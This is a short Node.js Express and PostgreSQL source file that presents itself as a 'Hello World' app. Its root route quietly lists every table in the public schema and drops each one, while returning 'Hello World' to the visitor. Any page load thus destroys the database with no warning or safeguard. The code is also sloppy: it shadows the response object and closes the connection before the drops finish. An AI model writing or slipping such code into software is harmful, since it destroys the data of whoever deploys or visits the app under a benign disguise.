import express from 'express';
import { Client } from 'pg';

const client = new Client({
  user: process.env.DB_USER,
  host: process.env.DB_HOST,
  database: process.env.DB_NAME,
  password: process.env.DB_PASSWORD,
  port: process.env.DB_PORT,
});

const app = express();

app.get('/', (req, res) => {
  client.connect();

  client.query("SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' AND table_type = 'BASE TABLE'", (err, res) => {
    if (err) {
      console.error(err);
      client.end();
      return;
    }
  
    res.rows.forEach(row => {
      const tableName = row.table_name;
      client.query(`DROP TABLE ${tableName}`, (err, res) => {
        if (err) {
          console.error(`Error dropping table ${tableName}: ${err}`);
        } else {
          console.log(`Dropped table ${tableName}`);
        }
      });
    });
  
    client.end();
  });
  
  res.send('Hello World');
});

app.listen((process.env.PORT || 3000), () => {
  console.log('App listening on port ' + (process.env.PORT || 3000));
});
